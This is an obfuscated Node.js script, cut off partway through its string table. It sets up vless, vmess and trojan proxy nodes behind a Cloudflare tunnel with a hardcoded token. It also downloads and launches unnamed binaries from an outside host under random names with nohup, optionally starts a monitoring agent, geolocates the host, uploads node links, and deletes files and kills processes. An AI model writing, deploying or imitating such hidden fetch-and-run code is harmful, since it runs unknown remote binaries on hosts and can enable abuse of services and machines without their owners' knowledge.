const _0x391427=_0x2445;(function(_0x1a55d7,_0x1e0b5f){const _0x79a622={_0x1ee805:0x178,_0x2e73ce:0x1c6,_0x47deba:0x192,_0x141a7e:0x1e5,_0x564cca:0x1f9,_0x222760:0x1e8},_0x268376=_0x2445,_0x1b65b4=_0x1a55d7();while(!![]){try{const _0x34932d=parseInt(_0x268376(_0x79a622._0x1ee805))/0x1+-parseInt(_0x268376(0x1e3))/0x2+parseInt(_0x268376(_0x79a622._0x2e73ce))/0x3*(-parseInt(_0x268376(0x14d))/0x4)+parseInt(_0x268376(_0x79a622._0x47deba))/0x5+-parseInt(_0x268376(_0x79a622._0x141a7e))/0x6+-parseInt(_0x268376(0x194))/0x7+parseInt(_0x268376(_0x79a622._0x564cca))/0x8*(parseInt(_0x268376(_0x79a622._0x222760))/0x9);if(_0x34932d===_0x1e0b5f)break;else _0x1b65b4['push'](_0x1b65b4['shift']());}catch(_0x41e35a){_0x1b65b4['push'](_0x1b65b4['shift']());}}}(_0x3765,0xe56ed));const express=require(_0x391427(0x1cb)),app=express(),axios=require(_0x391427(0x1dc)),os=require('os'),fs=require('fs'),path=require(_0x391427(0x19e)),{promisify}=require(_0x391427(0x1d8)),exec=promisify(require('child_process')[_0x391427(0x201)]),UPLOAD_URL=process[_0x391427(0x15f)][_0x391427(0x1ad)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x391427(0x15f)][_0x391427(0x1c7)]||![],FILE_PATH=process['env'][_0x391427(0x169)]||_0x391427(0x152),SUB_PATH=process[_0x391427(0x15f)][_0x391427(0x1db)]||_0x391427(0x195),PORT=process['env'][_0x391427(0x188)]||process[_0x391427(0x15f)][_0x391427(0x1a0)]||0xbb8,UUID=process[_0x391427(0x15f)][_0x391427(0x171)]||_0x391427(0x1a7),NEZHA_SERVER=process['env'][_0x391427(0x153)]||'',NEZHA_PORT=process[_0x391427(0x15f)][_0x391427(0x1f3)]||'',NEZHA_KEY=process['env'][_0x391427(0x1fe)]||'',ARGO_DOMAIN=process[_0x391427(0x15f)][_0x391427(0x142)]||_0x391427(0x1cc),ARGO_AUTH=process[_0x391427(0x15f)][_0x391427(0x1e9)]||_0x391427(0x14c),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x391427(0x15f)][_0x391427(0x187)]||_0x391427(0x161),CFPORT=process[_0x391427(0x15f)][_0x391427(0x1c3)]||0x1bb,NAME=process['env'][_0x391427(0x149)]||_0x391427(0x1d6);!fs[_0x391427(0x1bf)](FILE_PATH)?(fs[_0x391427(0x196)](FILE_PATH),console[_0x391427(0x1df)](FILE_PATH+_0x391427(0x1ff))):console[_0x391427(0x1df)](FILE_PATH+_0x391427(0x1ed));function generateRandomName(){const _0x1d5463={_0x1971b0:0x1c5},_0x3182bc=_0x391427,_0x59ed6a=_0x3182bc(0x13c);let _0x328cb7='';for(let _0x5460dc=0x0;_0x5460dc<0x6;_0x5460dc++){_0x328cb7+=_0x59ed6a[_0x3182bc(0x146)](Math[_0x3182bc(0x15b)](Math[_0x3182bc(0x1c4)]()*_0x59ed6a[_0x3182bc(_0x1d5463._0x1971b0)]));}return _0x328cb7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x391427(0x172)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x391427(0x172)](FILE_PATH,_0x391427(0x145)),listPath=path[_0x391427(0x172)](FILE_PATH,_0x391427(0x16a)),bootLogPath=path[_0x391427(0x172)](FILE_PATH,'boot.log'),configPath=path[_0x391427(0x172)](FILE_PATH,_0x391427(0x1a2));function deleteNodes(){const _0x4430f5={_0x37d488:0x1f1,_0x93a634:0x1a3,_0x391d2b:0x151,_0x21cb22:0x179,_0x1e16bb:0x1c5,_0x21cb60:0x1d5},_0x26bda5=_0x391427;try{if(!UPLOAD_URL)return;if(!fs[_0x26bda5(0x1bf)](subPath))return;let _0x2391bd;try{_0x2391bd=fs[_0x26bda5(_0x4430f5._0x37d488)](subPath,_0x26bda5(_0x4430f5._0x93a634));}catch{return null;}const _0x48b8f7=Buffer['from'](_0x2391bd,_0x26bda5(_0x4430f5._0x391d2b))[_0x26bda5(_0x4430f5._0x21cb22)]('utf-8'),_0x17d4eb=_0x48b8f7['split']('\x0a')[_0x26bda5(0x159)](_0x3ed892=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x26bda5(0x1d9)](_0x3ed892));if(_0x17d4eb[_0x26bda5(_0x4430f5._0x1e16bb)]===0x0)return;return axios[_0x26bda5(0x13f)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x26bda5(0x14a)]({'nodes':_0x17d4eb}),{'headers':{'Content-Type':_0x26bda5(_0x4430f5._0x21cb60)}})['catch'](_0x3c9243=>{return null;}),null;}catch(_0x1711e6){return null;}}function cleanupOldFiles(){const _0x232d41={_0xb2be0f:0x1ce},_0x28ace4={_0x282be7:0x172,_0x130ea:0x1bd},_0x3c978a=_0x391427;try{const _0x3b0f9b=fs[_0x3c978a(_0x232d41._0xb2be0f)](FILE_PATH);_0x3b0f9b[_0x3c978a(0x175)](_0x12f264=>{const _0x4fae43=_0x3c978a,_0x2539f2=path[_0x4fae43(_0x28ace4._0x282be7)](FILE_PATH,_0x12f264);try{const _0x5ee46b=fs[_0x4fae43(0x19f)](_0x2539f2);_0x5ee46b['isFile']()&&fs[_0x4fae43(_0x28ace4._0x130ea)](_0x2539f2);}catch(_0x420bf0){}});}catch(_0xda3a65){}}async function generateConfig(){const _0x40f9e2={_0x4ef6b3:0x173,_0x470eaa:0x1d1,_0x321077:0x1e2,_0x1f5199:0x18e,_0x480970:0x1ee,_0x254b5a:0x13b,_0x59e9dc:0x1d1,_0x24e5d1:0x13d,_0x596cec:0x18e,_0x3e61a7:0x14e,_0x28f867:0x1b7,_0x4f6a55:0x184,_0x51e629:0x17b,_0x39a6f8:0x162,_0xc46b78:0x200,_0x4c14ab:0x1a2,_0x16edf8:0x14a},_0x131612=_0x391427,_0x1ceb33={'log':{'access':_0x131612(0x173),'error':_0x131612(_0x40f9e2._0x4ef6b3),'loglevel':_0x131612(0x1ee)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x131612(0x1ee),'fallbacks':[{'dest':0xbb9},{'path':_0x131612(_0x40f9e2._0x470eaa),'dest':0xbba},{'path':_0x131612(_0x40f9e2._0x321077),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x131612(0x185)}},{'port':0xbb9,'listen':_0x131612(_0x40f9e2._0x1f5199),'protocol':_0x131612(0x13b),'settings':{'clients':[{'id':UUID}],'decryption':_0x131612(_0x40f9e2._0x480970)},'streamSettings':{'network':_0x131612(0x185),'security':_0x131612(0x1ee)}},{'port':0xbba,'listen':_0x131612(0x18e),'protocol':_0x131612(_0x40f9e2._0x254b5a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x131612(0x1ee)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x131612(_0x40f9e2._0x59e9dc)}},'sniffing':{'enabled':!![],'destOverride':[_0x131612(0x14b),_0x131612(_0x40f9e2._0x24e5d1),_0x131612(0x14e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x131612(_0x40f9e2._0x596cec),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x131612(0x13d),_0x131612(_0x40f9e2._0x3e61a7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x131612(_0x40f9e2._0x1f5199),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x131612(_0x40f9e2._0x480970),'wsSettings':{'path':_0x131612(0x1f5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x131612(_0x40f9e2._0x24e5d1),_0x131612(0x14e)],'metadataOnly':![]}}],'dns':{'servers':[_0x131612(_0x40f9e2._0x28f867)]},'outbounds':[{'protocol':_0x131612(_0x40f9e2._0x4f6a55),'tag':_0x131612(_0x40f9e2._0x51e629)},{'protocol':_0x131612(_0x40f9e2._0x39a6f8),'tag':_0x131612(0x160)}]};fs[_0x131612(_0x40f9e2._0xc46b78)](path[_0x131612(0x172)](FILE_PATH,_0x131612(_0x40f9e2._0x4c14ab)),JSON[_0x131612(_0x40f9e2._0x16edf8)](_0x1ceb33,null,0x2));}function getSystemArchitecture(){const _0x4b8028={_0x5e26b0:0x15c,_0x472f44:0x1d7,_0x26e1e5:0x1f8},_0x46259f=_0x391427,_0x1b150c=os['arch']();return _0x1b150c===_0x46259f(_0x4b8028._0x5e26b0)||_0x1b150c==='arm64'||_0x1b150c===_0x46259f(_0x4b8028._0x472f44)?_0x46259f(0x15c):_0x46259f(_0x4b8028._0x26e1e5);}function downloadFile(_0x51a018,_0x51ae27,_0x358392){const _0x25d299={_0xb20257:0x1bb,_0x27196f:0x202,_0x4647f8:0x1a5},_0x4af4fd={_0x3d3a41:0x1ca},_0x371923={_0x21aa83:0x1b0,_0x4a2b67:0x1bb,_0x13cd13:0x1a5},_0x2c19ea=_0x391427,_0x370779=_0x51a018;!fs['existsSync'](FILE_PATH)&&fs[_0x2c19ea(0x196)](FILE_PATH,{'recursive':!![]});const _0x334407=fs[_0x2c19ea(0x176)](_0x370779);axios({'method':'get','url':_0x51ae27,'responseType':'stream'})['then'](_0x453bdd=>{const _0x4a5505={_0x3bf3be:0x1fb},_0x33a13c=_0x2c19ea;_0x453bdd[_0x33a13c(0x191)]['pipe'](_0x334407),_0x334407['on'](_0x33a13c(_0x4af4fd._0x3d3a41),()=>{const _0x2a3193=_0x33a13c;_0x334407[_0x2a3193(0x17c)](),console['log'](_0x2a3193(0x1b0)+path[_0x2a3193(0x1bb)](_0x370779)+_0x2a3193(_0x4a5505._0x3bf3be)),_0x358392(null,_0x370779);}),_0x334407['on'](_0x33a13c(0x1a5),_0x451175=>{const _0x2194ad=_0x33a13c;fs['unlink'](_0x370779,()=>{});const _0x5e4e4d=_0x2194ad(_0x371923._0x21aa83)+path[_0x2194ad(_0x371923._0x4a2b67)](_0x370779)+'\x20failed:\x20'+_0x451175[_0x2194ad(0x1b6)];console[_0x2194ad(_0x371923._0x13cd13)](_0x5e4e4d),_0x358392(_0x5e4e4d);});})[_0x2c19ea(0x1da)](_0x297fc9=>{const _0x24a77a=_0x2c19ea,_0x3c3c47=_0x24a77a(0x1b0)+path[_0x24a77a(_0x25d299._0xb20257)](_0x370779)+_0x24a77a(_0x25d299._0x27196f)+_0x297fc9[_0x24a77a(0x1b6)];console[_0x24a77a(_0x25d299._0x4647f8)](_0x3c3c47),_0x358392(_0x3c3c47);});}async function downloadFilesAndRun(){const _0x187610={_0x14ea9d:0x1c5,_0x475b5c:0x1f2,_0x3a95e2:0x150,_0x574788:0x186,_0x27a8ca:0x1c1,_0x22b488:0x18d,_0x24f492:0x1ab,_0xba4662:0x172,_0x5610c1:0x17f,_0x223324:0x1df,_0x4b603b:0x150,_0x2d7c88:0x203,_0x220fd3:0x1c0,_0x4926d3:0x199,_0x46b30e:0x170,_0x22ae88:0x1b3,_0x554c70:0x204,_0x3b43f5:0x1df,_0x5bcabe:0x18c,_0x24fbc2:0x1be,_0x564d67:0x1a5,_0x208eaa:0x174,_0x2d8a63:0x154,_0x263f09:0x1e7,_0x1a82bb:0x166},_0x33e1de={_0x1bf031:0x175},_0x5389fb={_0x166585:0x1bf},_0x48394a=_0x391427,_0x4843a3=getSystemArchitecture(),_0x969d6a=getFilesForArchitecture(_0x4843a3);if(_0x969d6a[_0x48394a(_0x187610._0x14ea9d)]===0x0){console[_0x48394a(0x1df)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x384822=_0x969d6a[_0x48394a(0x17a)](_0x12958d=>{const _0x30eb1d={_0x3dd499:0x14f};return new Promise((_0x5bfb76,_0x16aad3)=>{const _0x3922ac=_0x2445;downloadFile(_0x12958d[_0x3922ac(0x17d)],_0x12958d[_0x3922ac(_0x30eb1d._0x3dd499)],(_0x47526a,_0x71946b)=>{_0x47526a?_0x16aad3(_0x47526a):_0x5bfb76(_0x71946b);});});});try{await Promise[_0x48394a(0x1f6)](_0x384822);}catch(_0x47c02e){console['error'](_0x48394a(_0x187610._0x475b5c),_0x47c02e);return;}function _0x4ffd0b(_0xb4936b){const _0xd171cb=_0x48394a,_0x3cc757=0x1fd;_0xb4936b[_0xd171cb(_0x33e1de._0x1bf031)](_0x18551c=>{const _0x58055d={_0x34e003:0x1df,_0x1b4b1d:0x179},_0x1607cb=_0xd171cb;fs[_0x1607cb(_0x5389fb._0x166585)](_0x18551c)&&fs[_0x1607cb(0x1a1)](_0x18551c,_0x3cc757,_0x592817=>{const _0x375329=_0x1607cb;_0x592817?console['error'](_0x375329(0x1ba)+_0x18551c+':\x20'+_0x592817):console[_0x375329(_0x58055d._0x34e003)](_0x375329(0x1ec)+_0x18551c+':\x20'+_0x3cc757[_0x375329(_0x58055d._0x1b4b1d)](0x8));});});}const _0x236d7e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4ffd0b(_0x236d7e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5b3753=NEZHA_SERVER[_0x48394a(0x199)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x38cf13=new Set([_0x48394a(0x1eb),_0x48394a(0x1c9),_0x48394a(_0x187610._0x3a95e2),'2087',_0x48394a(0x1c0),_0x48394a(_0x187610._0x574788)]),_0x5ac2ff=_0x38cf13['has'](_0x5b3753)?_0x48394a(_0x187610._0x27a8ca):_0x48394a(0x1d2),_0x287619=_0x48394a(0x1f7)+NEZHA_KEY+_0x48394a(_0x187610._0x22b488)+NEZHA_SERVER+_0x48394a(_0x187610._0x24f492)+_0x5ac2ff+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x48394a(0x200)](path[_0x48394a(_0x187610._0xba4662)](FILE_PATH,_0x48394a(_0x187610._0x5610c1)),_0x287619);const _0x103def=_0x48394a(0x170)+phpPath+_0x48394a(0x189)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x103def),console[_0x48394a(_0x187610._0x223324)](phpName+_0x48394a(0x1be)),await new Promise(_0xc364dc=>setTimeout(_0xc364dc,0x3e8));}catch(_0x2a9257){console['error'](_0x48394a(0x144)+_0x2a9257);}}else{let _0x4453d4='';const _0x1f917d=[_0x48394a(0x1eb),'8443',_0x48394a(_0x187610._0x4b603b),_0x48394a(_0x187610._0x2d7c88),_0x48394a(_0x187610._0x220fd3),_0x48394a(0x186)];_0x1f917d[_0x48394a(_0x187610._0x4926d3)](NEZHA_PORT)&&(_0x4453d4='--tls');const _0x13f6f0=_0x48394a(_0x187610._0x46b30e)+npmPath+_0x48394a(_0x187610._0x22ae88)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x4453d4+_0x48394a(_0x187610._0x554c70);try{await exec(_0x13f6f0),console[_0x48394a(0x1df)](npmName+'\x20is\x20running'),await new Promise(_0x1eb511=>setTimeout(_0x1eb511,0x3e8));}catch(_0x3265c0){console['error'](_0x48394a(0x1e4)+_0x3265c0);}}}else console[_0x48394a(_0x187610._0x3b43f5)](_0x48394a(0x206));const _0x287dc9='nohup\x20'+webPath+_0x48394a(_0x187610._0x5bcabe)+FILE_PATH+_0x48394a(0x190);try{await exec(_0x287dc9),console[_0x48394a(0x1df)](webName+_0x48394a(_0x187610._0x24fbc2)),await new Promise(_0x582072=>setTimeout(_0x582072,0x3e8));}catch(_0x416c83){console[_0x48394a(_0x187610._0x564d67)](_0x48394a(_0x187610._0x208eaa)+_0x416c83);}if(fs[_0x48394a(0x1bf)](botPath)){let _0x9edf37;if(ARGO_AUTH[_0x48394a(0x165)](/^[A-Z0-9a-z=]{120,250}$/))_0x9edf37=_0x48394a(0x13a)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x9edf37='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x48394a(_0x187610._0x2d8a63):_0x9edf37=_0x48394a(0x183)+FILE_PATH+_0x48394a(0x1d4)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x9edf37+_0x48394a(_0x187610._0x263f09)),console[_0x48394a(0x1df)](botName+_0x48394a(0x1be)),await new Promise(_0xebccd4=>setTimeout(_0xebccd4,0x7d0));}catch(_0xbb3e1c){console['error'](_0x48394a(_0x187610._0x1a82bb)+_0xbb3e1c);}}await new Promise(_0x5ac2b9=>setTimeout(_0x5ac2b9,0x1388));}function getFilesForArchitecture(_0x45fbb5){const _0x103fdc={_0x3dacb8:0x15c,_0x2bfc93:0x181,_0x4f744d:0x163,_0x57df0c:0x193,_0x244b85:0x1d3,_0x3607fd:0x15c},_0x11a399=_0x391427;let _0x4653f7;_0x45fbb5===_0x11a399(_0x103fdc._0x3dacb8)?_0x4653f7=[{'fileName':webPath,'fileUrl':_0x11a399(0x1c8)},{'fileName':botPath,'fileUrl':_0x11a399(_0x103fdc._0x2bfc93)}]:_0x4653f7=[{'fileName':webPath,'fileUrl':_0x11a399(0x164)},{'fileName':botPath,'fileUrl':_0x11a399(_0x103fdc._0x4f744d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4b5a32=_0x45fbb5===_0x11a399(_0x103fdc._0x3dacb8)?_0x11a399(0x158):_0x11a399(_0x103fdc._0x57df0c);_0x4653f7[_0x11a399(_0x103fdc._0x244b85)]({'fileName':npmPath,'fileUrl':_0x4b5a32});}else{const _0x5c1f9f=_0x45fbb5===_0x11a399(_0x103fdc._0x3607fd)?_0x11a399(0x1ef):_0x11a399(0x156);_0x4653f7[_0x11a399(0x1d3)]({'fileName':phpPath,'fileUrl':_0x5c1f9f});}}return _0x4653f7;}function argoType(){const _0x5e7281={_0x8541e3:0x1df,_0x26b85f:0x167,_0x5865e7:0x197,_0x4d0636:0x143,_0x1b1123:0x1f0,_0x5909f3:0x180,_0x43b653:0x1b2,_0x4605ce:0x172,_0xce800:0x1aa},_0x2bed2b=_0x391427;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2bed2b(_0x5e7281._0x8541e3)](_0x2bed2b(_0x5e7281._0x26b85f));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs['writeFileSync'](path[_0x2bed2b(0x172)](FILE_PATH,_0x2bed2b(_0x5e7281._0x5865e7)),ARGO_AUTH);const _0x3cf53c=_0x2bed2b(0x1e0)+ARGO_AUTH[_0x2bed2b(_0x5e7281._0x4d0636)]('\x22')[0xb]+_0x2bed2b(_0x5e7281._0x1b1123)+path[_0x2bed2b(0x172)](FILE_PATH,_0x2bed2b(_0x5e7281._0x5865e7))+_0x2bed2b(_0x5e7281._0x5909f3)+ARGO_DOMAIN+_0x2bed2b(0x1b4)+ARGO_PORT+_0x2bed2b(_0x5e7281._0x43b653);fs[_0x2bed2b(0x200)](path[_0x2bed2b(_0x5e7281._0x4605ce)](FILE_PATH,_0x2bed2b(_0x5e7281._0xce800)),_0x3cf53c);}else console[_0x2bed2b(_0x5e7281._0x8541e3)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x275dff={_0x181004:0x1a6,_0x221161:0x172,_0x155692:0x1e1,_0x126df2:0x175,_0x52dc23:0x15a,_0x1dd098:0x1bd,_0x158859:0x170,_0xb27c97:0x1be},_0x441a08={_0x22a574:0x191,_0x1035b1:0x1b5,_0x5e7372:0x1fa,_0x222f8a:0x191,_0x44faef:0x191},_0x397151={_0x474317:0x1b8,_0x357b28:0x19b,_0x46fcb3:0x146},_0x21c43d=_0x391427;let _0x5433d8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5433d8=ARGO_DOMAIN,console[_0x21c43d(0x1df)](_0x21c43d(_0x275dff._0x181004),_0x5433d8),await _0x14c6b2(_0x5433d8);else try{const _0xf5e8f0=fs[_0x21c43d(0x1f1)](path[_0x21c43d(_0x275dff._0x221161)](FILE_PATH,_0x21c43d(_0x275dff._0x155692)),_0x21c43d(0x1a3)),_0x2924dd=_0xf5e8f0['split']('\x0a'),_0x4c7cc2=[];_0x2924dd[_0x21c43d(_0x275dff._0x126df2)](_0xd5692c=>{const _0x1cca37=_0x21c43d,_0xba773c=_0xd5692c['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xba773c){const _0x5adecd=_0xba773c[0x1];_0x4c7cc2[_0x1cca37(0x18a)](_0x5adecd);}});if(_0x4c7cc2['length']>0x0)_0x5433d8=_0x4c7cc2[0x0],console[_0x21c43d(0x1df)](_0x21c43d(_0x275dff._0x52dc23),_0x5433d8),await _0x14c6b2(_0x5433d8);else{console[_0x21c43d(0x1df)](_0x21c43d(0x17e)),fs[_0x21c43d(_0x275dff._0x1dd098)](path[_0x21c43d(0x172)](FILE_PATH,'boot.log'));async function _0x4499b0(){const _0x393aae=_0x21c43d;try{process[_0x393aae(_0x397151._0x474317)]===_0x393aae(0x16e)?await exec(_0x393aae(_0x397151._0x357b28)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x393aae(_0x397151._0x46fcb3)](0x0)+']'+botName['substring'](0x1)+_0x393aae(0x141));}catch(_0x27e633){}}_0x4499b0(),await new Promise(_0x51f7f6=>setTimeout(_0x51f7f6,0xbb8));const _0x2717f2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x21c43d(0x1d4)+ARGO_PORT;try{await exec(_0x21c43d(_0x275dff._0x158859)+botPath+'\x20'+_0x2717f2+_0x21c43d(0x1e7)),console[_0x21c43d(0x1df)](botName+_0x21c43d(_0x275dff._0xb27c97)),await new Promise(_0x3eaa8f=>setTimeout(_0x3eaa8f,0xbb8)),await extractDomains();}catch(_0x39931c){console['error'](_0x21c43d(0x166)+_0x39931c);}}}catch(_0x113ca9){console[_0x21c43d(0x1a5)](_0x21c43d(0x1b9),_0x113ca9);}async function _0x405a8c(){const _0x47060c=_0x21c43d;try{const _0x4711a6=await axios['get']('https://ipapi.co/json',{'timeout':0xbb8});if(_0x4711a6[_0x47060c(_0x441a08._0x22a574)]&&_0x4711a6[_0x47060c(0x191)][_0x47060c(0x1fc)]&&_0x4711a6[_0x47060c(_0x441a08._0x22a574)][_0x47060c(0x1b5)])return _0x4711a6['data'][_0x47060c(0x1fc)]+'_'+_0x4711a6[_0x47060c(_0x441a08._0x22a574)][_0x47060c(_0x441a08._0x1035b1)];}catch(_0x252bcd){try{const _0x1600e7=await axios[_0x47060c(_0x441a08._0x5e7372)](_0x47060c(0x1b1),{'timeout':0xbb8});if(_0x1600e7['data']&&_0x1600e7['data'][_0x47060c(0x140)]===_0x47060c(0x177)&&_0x1600e7[_0x47060c(_0x441a08._0x222f8a)]['countryCode']&&_0x1600e7[_0x47060c(0x191)]['org'])return _0x1600e7[_0x47060c(_0x441a08._0x222f8a)][_0x47060c(0x1cd)]+'_'+_0x1600e7[_0x47060c(_0x441a08._0x44faef)]['org'];}catch(_0x195b54){}}return _0x47060c(0x205);}async function _0x14c6b2(_0x14160c){const _0x2cf805={_0x37221b:0x1ee,_0x529e69:0x1ee,_0x11005e:0x157,_0x5aeea7:0x13d,_0x128a91:0x155,_0x48f0a9:0x1af,_0x5d19e0:0x19d,_0x1e3e60:0x1ea,_0x546fa0:0x168,_0x416809:0x1dd,_0x348ed6:0x15d,_0x1fbd66:0x19c,_0x1f3d01:0x1cf,_0x15b217:0x200,_0x282ba0:0x151},_0x429254=await _0x405a8c(),_0x57860c=NAME?NAME+'-'+_0x429254:_0x429254;return new Promise(_0x755413=>{setTimeout(()=>{const _0x285db2={_0x12dee8:0x198,_0x476e67:0x16d},_0x552928=_0x2445,_0x2ac6fe={'v':'2','ps':''+_0x57860c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x552928(_0x2cf805._0x37221b),'net':'ws','type':_0x552928(_0x2cf805._0x529e69),'host':_0x14160c,'path':_0x552928(_0x2cf805._0x11005e),'tls':_0x552928(_0x2cf805._0x5aeea7),'sni':_0x14160c,'alpn':'','fp':'firefox'},_0x4488d9=_0x552928(_0x2cf805._0x128a91)+UUID+'@'+CFIP+':'+CFPORT+_0x552928(_0x2cf805._0x48f0a9)+_0x14160c+_0x552928(_0x2cf805._0x5d19e0)+_0x14160c+_0x552928(_0x2cf805._0x1e3e60)+_0x57860c+_0x552928(_0x2cf805._0x546fa0)+Buffer[_0x552928(_0x2cf805._0x416809)](JSON[_0x552928(0x14a)](_0x2ac6fe))['toString']('base64')+_0x552928(_0x2cf805._0x348ed6)+UUID+'@'+CFIP+':'+CFPORT+_0x552928(0x1c2)+_0x14160c+'&fp=firefox&type=ws&host='+_0x14160c+_0x552928(_0x2cf805._0x1fbd66)+_0x57860c+_0x552928(_0x2cf805._0x1f3d01);console['log'](Buffer[_0x552928(0x1dd)](_0x4488d9)[_0x552928(0x179)](_0x552928(0x151))),fs[_0x552928(_0x2cf805._0x15b217)](subPath,Buffer[_0x552928(0x1dd)](_0x4488d9)['toString'](_0x552928(_0x2cf805._0x282ba0))),console[_0x552928(0x1df)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x5f42b7,_0x2b9bb2)=>{const _0x31f616=_0x552928,_0x552fbd=Buffer['from'](_0x4488d9)['toString'](_0x31f616(0x151));_0x2b9bb2[_0x31f616(_0x285db2._0x12dee8)](_0x31f616(0x1ae),_0x31f616(_0x285db2._0x476e67)),_0x2b9bb2[_0x31f616(0x16f)](_0x552fbd);}),_0x755413(_0x4488d9);},0x7d0);});}}function _0x3765(){const _0x42e8dc=['http://ip-api.com/json','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-s\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','org','message','https+local://8.8.8.8/dns-query','platform','Error\x20reading\x20boot.log:','Empowerment\x20failed\x20for\x20','basename','rm\x20-rf\x20','unlinkSync','\x20is\x20running','existsSync','2083','true','?security=tls&sni=','CFPORT','random','length','2851341hJvBJh','AUTO_ACCESS','https://arm64.ssss.nyc.mn/web','8443','finish','express','galaxy-ap.leovip.qzz.io','countryCode','readdirSync','\x0a\x20\x20\x20\x20','clear','/vless-argo','false','unshift','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','application/json','Galaxy','aarch64','util','test','catch','SUB_PATH','axios','from','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','log','\x0a\x20\x20tunnel:\x20','boot.log','/vmess-argo','3166118eDppZw','npm\x20running\x20error:\x20','4854246rcKcQl','App\x20is\x20running','\x20>/dev/null\x202>&1\x20&','792wHdPth','ARGO_AUTH','&path=%2Fvless-argo%3Fed%3D2560#','443','Empowerment\x20success\x20for\x20','\x20already\x20exists','none','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20credentials-file:\x20','readFileSync','Error\x20downloading\x20files:','NEZHA_PORT','promises','/trojan-argo','all','\x0aclient_secret:\x20','amd','447624tsdjIb','get','\x20successfully','country_code','\x20>/dev/null\x202>&1','NEZHA_KEY','\x20is\x20created','writeFileSync','exec','\x20failed:\x20','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Unknown','NEZHA\x20variable\x20is\x20empty,skip\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','vless','abcdefghijklmnopqrstuvwxyz','tls','/api/add-subscriptions','post','status','\x22\x20>\x20/dev/null\x202>&1','ARGO_DOMAIN','split','php\x20running\x20error:\x20','sub.txt','charAt','Add\x20automatic\x20access\x20task\x20faild:\x20','response','NAME','stringify','http','eyJhIjoiZjE1YTc0NjZlOGY1YTk0ZWNjZTRlMmM0YmE3NmM2ZWQiLCJ0IjoiZGI2MDY5NDUtNWFmNy00MTM0LTk4YjEtNGJiNjEwYWNjYzA2IiwicyI6IlpHTTBOMlpqWkRZdFpXUXdZaTAwTnpRMUxUaGtOR1l0TVRneFpESTFZbUZrTlRFeSJ9','4hzeBTT','quic','fileUrl','2096','base64','.tmp','NEZHA_SERVER','/tunnel.yml\x20run','\x0avless://','https://amd64.ssss.nyc.mn/v1','/vmess-argo?ed=2560','https://arm64.ssss.nyc.mn/agent','filter','ArgoDomain:','floor','arm','\x0a\x0atrojan://','https://oooo.serv00.net/add-url','env','block','cdns.doon.eu.org','blackhole','https://amd64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/web','match','Error\x20executing\x20command:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x0avmess://','FILE_PATH','list.txt','automatic\x20access\x20task\x20added\x20successfully','del\x20/f\x20/q\x20','text/plain;\x20charset=utf-8','win32','send','nohup\x20','UUID','join','/dev/null','web\x20running\x20error:\x20','forEach','createWriteStream','success','97326YRWKpq','toString','map','direct','close','fileName','